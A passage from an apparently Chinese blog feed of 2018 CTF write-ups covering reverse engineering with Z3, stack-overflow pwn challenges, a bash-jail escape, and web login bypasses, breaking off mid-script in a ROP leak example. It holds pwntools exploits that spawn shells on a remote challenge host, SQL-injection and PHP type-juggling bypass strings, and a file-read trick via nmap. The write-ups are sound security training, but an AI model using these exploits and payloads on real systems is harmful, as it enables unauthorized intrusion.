        <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">==</span> <span class="token number">32</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//这里提示了flag位数 如果等于32位然后满足 运算过得v7 等于v6 则</span>
          <span class="token function">sub_4012E9</span><span class="token punctuation">(</span>aGoodYouVeGotTh<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//输出 good you have got the flag</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">--</span>stru_408110<span class="token punctuation">.</span>_cnt <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
        <span class="token function">_filbuf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stru_408110<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">else</span>
        <span class="token operator">++</span>stru_408110<span class="token punctuation">.</span>_ptr<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">--</span>stru_408110<span class="token punctuation">.</span>_cnt <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
        <span class="token function">_filbuf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stru_408110<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">else</span>
        <span class="token operator">++</span>stru_408110<span class="token punctuation">.</span>_ptr<span class="token punctuation">;</span>
      result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
      <span class="token function">sub_4012E9</span><span class="token punctuation">(</span>aTooLong<span class="token punctuation">)</span><span class="token punctuation">;</span>
      result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">sub_4012E9</span><span class="token punctuation">(</span>aTooShort<span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里用Z3约束求解</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>

v6 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f</span><span class="token punctuation">,</span><span class="token number">0x3b</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0x4b</span><span class="token punctuation">,</span><span class="token number">0xdd</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0x47</span><span class="token punctuation">,</span><span class="token number">0xec</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0x43</span><span class="token punctuation">,</span><span class="token number">0xdc</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0xd4</span><span class="token punctuation">,</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0xde</span><span class="token punctuation">,</span><span class="token number">0x45</span><span class="token punctuation">,</span><span class="token number">0xbd</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x1b</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0xb9</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0x4e</span><span class="token punctuation">,</span><span class="token number">0xe2</span><span class="token punctuation">]</span>
v7 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x4b</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0xdc</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token number">0xcb</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x9b</span><span class="token punctuation">,</span><span class="token number">0x2b</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x82</span><span class="token punctuation">,</span><span class="token number">0x2b</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x8e</span><span class="token punctuation">,</span><span class="token number">0xe7</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x45</span><span class="token punctuation">,</span><span class="token number">0x5c</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">]</span>
v9 <span class="token operator">=</span> <span class="token punctuation">[</span>BitVec<span class="token punctuation">(</span><span class="token string">"v9%d"</span><span class="token operator">%</span>i<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true">#print v9</span>
S <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    S<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">32</span><span class="token punctuation">)</span>
    S<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>
    S<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token operator">*</span><span class="token punctuation">(</span>v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span>v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">//</span> 代码处uint8强制类型转换  uint8的上限是<span class="token number">256</span><span class="token operator">-</span><span class="token number">1</span> 下限是<span class="token number">0</span> 所以这里需要<span class="token operator">%</span><span class="token number">256</span> 让他自然溢出

<span class="token keyword">if</span> S<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat<span class="token punctuation">:</span>  
    m <span class="token operator">=</span> S<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    flag <span class="token operator">=</span> <span class="token string">''</span> 
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
       flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>m<span class="token punctuation">[</span>v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    
    <span class="token keyword">print</span> flag
</code></pre>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;easyphp&quot;&gt;&lt;a href=&quot;#easyphp&quot; class=&quot;headerlink&quot; title=&quot;easyphp
    
    </summary>
    
    
      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
    
      <category term="WEB" scheme="http://iosmosis.github.io/tags/WEB/"/>
    
      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
    
      <category term="BUPT" scheme="http://iosmosis.github.io/tags/BUPT/"/>
    
  </entry>
  
  <entry>
    <title>Syclover-Pwn-练习题</title>
    <link href="http://iosmosis.github.io/2018/06/09/Syclover-Pwn-%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
    <id>http://iosmosis.github.io/2018/06/09/Syclover-Pwn-练习题/</id>
    <published>2018-06-09T09:56:41.000Z</published>
    <updated>2018-06-10T13:50:04.104Z</updated>
    
    <content type="html"><![CDATA[<h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec stack1
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/stack1'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
ios@ubuntu:~$
</code></pre>
<p>开启NX保护<br>IAD载入分析代码<br>main()</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-20h]

  puts(&quot;get input&quot;);
  scanf(&quot;%s&quot;, &amp;v4);
  return 0;
}
</code></pre><p>get_shell()</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>int get_shell()
{
  return system(&quot;/bin/sh&quot;);
}
</code></pre><p>简单栈溢出 已给shell 所以覆盖v4之后ret到get_shell 地址即可<br>exp</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stack1'</span><span class="token punctuation">)</span>
sys_addr<span class="token operator">=</span><span class="token number">0x000000000004005B6</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>成功取得shell</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>ios@ubuntu:~$ python stack1.py
[+] Starting local process &#39;./stack1&#39;: pid 2228
[*] Switching to interactive mode
get input
$ ls
flag
$ 
[*] Interrupted
[*] Stopped process &#39;./stack1&#39; (pid 2228)
ios@ubuntu:~$
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;stack1&quot;&gt;&lt;a href=&quot;#stack1&quot; class=&quot;headerlink&quot; title=&quot;stack1&quot;&gt;&lt;/a&gt;stack1&lt;/h2&gt;&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;bash&quot; data-line
    
    </summary>
    
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
      <category term="栈溢出" scheme="http://iosmosis.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
    
      <category term="Syclover" scheme="http://iosmosis.github.io/tags/Syclover/"/>
    
  </entry>
  
  <entry>
    <title>NPUCTF部分Writeup</title>
    <link href="http://iosmosis.github.io/2018/05/13/NPUCTF%E9%83%A8%E5%88%86Writeup/"/>
    <id>http://iosmosis.github.io/2018/05/13/NPUCTF部分Writeup/</id>
    <published>2018-05-13T07:39:42.000Z</published>
    <updated>2018-05-27T11:00:03.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="/2018/05/13/NPUCTF部分Writeup/1.jpg" alt="ida1"></p>
<p>查看源码<br><img src="/2018/05/13/NPUCTF部分Writeup/2.jpg" alt="ida1"><br>得到Flag : flag{begin_to_npuctf}</p>
<ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文=""><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2></the></li>
</ul>
<p><img src="/2018/05/13/NPUCTF部分Writeup/3.jpg" alt="ida1"><br>猜测应该是js算法题目</p>
<p>查看源码发现主要算法<br><img src="/2018/05/13/NPUCTF部分Writeup/4.jpg" alt="ida1"></p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>可以看到</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>var b = &quot;56ab34c15b73a457069c58a43fcfc640&quot;;
var d = 0x0;
var e = a.substr(0x8, 0x5);
if ($.md5(e) == b.replace(/3/ig, ++d+1).replace(/8/ig, &#39;e&#39;))
</code></pre><p>通过控制台可以获得e<br><img src="/2018/05/13/NPUCTF部分Writeup/5.jpg" alt="ida1"><br>解密可以获得9-13位 happy</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>if (f.substr(0x5, 0x2) == &quot;be&quot; &amp;&amp; $.md5(f.substr(0x0 / d, d + 0x3)) == &quot;327a6c4304ad5938eaf0efb6cc3e53dc&quot;) {
</code></pre><p>可得 6 7位为 be<br>解密  327a6c4304ad5938eaf0efb6cc3e53dc 可获得 0-3位为 flag</p>
<p><img src="/2018/05/13/NPUCTF部分Writeup/6.jpg" alt="ida1"></p>
<p>运行可以获得g=np</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>if (r.substr((++d) * 0x3, 0x6) == g.concat(&quot;uctf&quot;) &amp;&amp; c.test(a)) {
</code></pre><p>分析可知 得到的g和uctf进行拼接 得到 npuctf 15-22位</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>&lt;pre name=&quot;code&quot; class=&quot;javascript&quot; style=&quot;font-size: 13.3333px;&quot;&gt;r.charCodeAt(--d) - 0x19 == r.charCodeAt(--d) //r[1]-0x19==r[0]
之后根据正则可知r[0]=&#39;_&#39;
</code></pre><p> 倒回去看r变量的判断</p>
<p>0的值为_下划线unicode码加25</p>
<p>所以在控制台输入下面3条代码，即可得r两个相同的字符为xx</p>
<p>var r = ‘_’</p>
<p>console.log(r.charCodeAt(0))</p>
<p>console.log(String.fromCharCode(95+25))<br>所以最后拼接可得<br>flag{be_happy_xxnpuctf}</p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>题目：你需要懂一些Linux命令，已经为你装好了某著名黑客工具。<br><img src="/2018/05/13/NPUCTF部分Writeup/7.jpg" alt="ida1"><br>测试可知 可以执行一些命令 并且 ls列出了flag所在目录<br><img src="/2018/05/13/NPUCTF部分Writeup/8.jpg" alt="ida1"><br>但是却无法使用 cd cat 等一系列命令</p>
<p>右键查看源码<br><img src="/2018/05/13/NPUCTF部分Writeup/9.jpg" alt="ida1"><br>发现提示 可以猜测应该 是可以使用nmap<br>所以使用命令 </p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>nmap -iL /tmp/flag/flag.txt
</code></pre><p><img src="/2018/05/13/NPUCTF部分Writeup/10.jpg" alt="ida1"><br>得到Flag : flag{nice_Command}</p>
<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p><img src="/2018/05/13/NPUCTF部分Writeup/11.jpg" alt="ida1"><br>进入发现需要登录</p>
<p>右键查看源码得到提示<br><img src="/2018/05/13/NPUCTF部分Writeup/12.jpg" alt="ida1"><br>这里存在PHP弱类型漏洞 提交name=240610708 pass=QNKCDZO 成功绕过</p>
<p><img src="/2018/05/13/NPUCTF部分Writeup/13.jpg" alt="ida1"></p>
<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p> 根据放的hint可尝试万能密码绕过<br>提交 ‘or’=’or’ 成功绕过</p>
<p><img src="/2018/05/13/NPUCTF部分Writeup/14.jpg" alt="ida1"></p>
<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>提示了name为 npusec 但是密码未知所以这里猜测需要爆破密码</p>
<p>通过robots.txt泄露 </p>
<p><img src="/2018/05/13/NPUCTF部分Writeup/15.jpg" alt="ida1"><br>得到 密码字典 所以进行爆破即可</p>
<p><img src="/2018/05/13/NPUCTF部分Writeup/16.jpg" alt="ida1"><br>得到密码为 1234npuuu<br><img src="/2018/05/13/NPUCTF部分Writeup/17.jpg" alt="ida1"><br>登录获得Flag : flag{W3lcOme_com3_to_ctf}</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwn-checkin"><a href="#pwn-checkin" class="headerlink" title="pwn_checkin"></a>pwn_checkin</h2><p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-48h]</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"why not you input something?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>漏洞存在于gets函数<br>继续分析 </p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>int call_system()
{
  return system(&quot;/bin/sh&quot;);
}
</code></pre><p>题目中提供了shell所以 只需要溢出 修改ret到 call_system 地址即可</p>
<p>offset = rbp-48h -(rbp-0x4)</p>
<p>所以构造exp</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#p = process('./checkin')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'149.28.142.91'</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span>
sys_addr <span class="token operator">=</span> <span class="token number">0x080484EB</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x48</span> <span class="token operator">+</span><span class="token string">'aaaa'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span> payload
<span class="token comment" spellcheck="true">#p.recv('why not you input something?')</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="baby-bashjail"><a href="#baby-bashjail" class="headerlink" title="baby_bashjail"></a>baby_bashjail</h2><p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-20h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts(&quot;======baby jail======&quot;);
  while ( 1 )
  {
    putchar(62);
    fgets(&amp;s, 20, stdin);
    if ( (unsigned int)filter(&amp;s, 20LL) )
      break;
    system(&amp;s);
  }
  putchar(62);
  puts(&quot;No way! Little Hacker!&quot;);
  return 0;
}
</code></pre><p>发现程序提供了system 但是 使用前使用filter进行参数的判断<br>查看 filter函数</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>_int64 __fastcall filter(const char *a1)
{
  int i; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  v3 = strlen(a1);
  for ( i = 0; i &lt; v3; ++i )
  {
    switch ( a1[i] )
    {
      case &#39;l&#39;:
        return 1LL;
      case &#39;s&#39;:
        return 1LL;
      case &#39;c&#39;:
        return 1LL;
    }
    switch ( a1[i] )
    {
      case &#39;a&#39;:
        return 1LL;
      case &#39;t&#39;:
        return 1LL;
      case &#39;f&#39;:
        return 1LL;
      case &#39;l&#39;:
        return 1LL;
      case &#39;g&#39;:
        return 1LL;
      case &#39;*&#39;:
        return 1LL;
      case &#39;c&#39;:
        return 1LL;
    }
  }
  return deep_filter(a1);
}
</code></pre><p>进行判断检查 不能存在这些关键字母 并传入depp_filter<br>查看deep_filter</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>signed __int64 __fastcall deep_filter(const char *a1)
{
  int i; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  v3 = strlen(a1);
  for ( i = 0; i &lt; v3; ++i )
  {
    switch ( a1[i] )
    {
      case &#39;b&#39;:
        return 1LL;
      case &#39;d&#39;:
        return 1LL;
      case &#39;e&#39;:
        return 1LL;
      case &#39;h&#39;:
        return 1LL;
      case &#39;i&#39;:
        return 1LL;
      case &#39;j&#39;:
        return 1LL;
      case &#39;k&#39;:
        return 1LL;
      case &#39;m&#39;:
        return 1LL;
      case &#39;n&#39;:
        return 1LL;
      case &#39;o&#39;:
        return 1LL;
      case &#39;p&#39;:
        return 1LL;
      case &#39;q&#39;:
        return 1LL;
      case &#39;r&#39;:
        return 1LL;
      case &#39;s&#39;:
        return 1LL;
      case &#39;u&#39;:
        return 1LL;
      case &#39;v&#39;:
        return 1LL;
      case &#39;w&#39;:
        return 1LL;
      case &#39;x&#39;:
        return 1LL;
      case &#39;y&#39;:
        return 1LL;
      case &#39;z&#39;:
        return 1LL;
    }
  }
  return 0LL;
}
</code></pre><p>哇 这么狠 原来就是把所有字母都过滤的<br>但是题目需要利用system进行flag的获取<br>argv[0]相当于 sh<br>所以 只需要传入 $0 就可以获取一个shell</p>
<p>EXP</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'149.28.142.91'</span><span class="token punctuation">,</span><span class="token number">10002</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'$0'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="Warrior-Tales"><a href="#Warrior-Tales" class="headerlink" title="Warrior_Tales"></a>Warrior_Tales</h2><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec warrior_tales
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/warrior_tales'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
ios@ubuntu:~$
</code></pre>
<p>开启NX和RELRO</p>
<p>载入IDA分析 漏洞存在于vlun函数里</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vlun</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-30h]</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hero! Now, write something for your story!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//漏洞利用点</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What a wonderful ending!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>但是由于RELRO开启不能直接利用libc构造rop 必须leak出真实地址进而获得system_addr<br>之前由于偏移写错导致leak一直有问题0.0<br>通过构造循环来leak puts_addr<br>这里构造思路有两种<br>第一种</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
vlun_addr <span class="token operator">=</span> <span class="token number">0x08048659</span>

